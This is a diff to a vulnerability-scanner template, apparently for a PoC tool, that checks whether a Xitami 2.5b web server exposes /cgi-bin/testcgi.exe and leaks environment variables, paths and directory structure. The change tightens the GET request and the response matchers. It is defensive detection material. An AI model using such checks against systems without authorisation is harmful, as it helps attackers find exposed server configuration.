@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 Xitami 2.5b Web 服务器默认安装的 /cgi-bin/testcgi.exe 是否可被远程访问并泄露敏感配置信息"
+author = "ave"
+description = "Xitami 2.5b Web 服务器默认在 cgi-bin 目录下安装 testcgi.exe，远程攻击者无需认证即可访问该 CGI 程序，获取服务器环境变量、系统路径、目录结构等敏感配置信息。通过发送 HTTP GET 请求到 /cgi-bin/testcgi.exe 并检查响应中是否包含 CGI 环境变量特征字符串来验证漏洞存在。"
 id = "POC-AVE-2000-1155"
-name = "Xitami Web服务器 testcgi.exe 敏感信息泄露漏洞 PoC"
+name = "Xitami 2.5b testcgi.exe 敏感信息泄露 PoC"
 severity = "medium"
 tags = ["ave-2000-1155"]
 vuln_id = [
@@ -11,12 +11,16 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
 path = "/{{BaseURL}}/cgi-bin/testcgi.exe"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
@@ -24,7 +28,7 @@ part = "body"
 type = "word"
 words = [
     "SERVER_SOFTWARE",
-    "SERVER_NAME",
     "GATEWAY_INTERFACE",
-    "testcgi",
+    "PATH_TRANSLATED",
+    "SERVER_PROTOCOL",
 ]
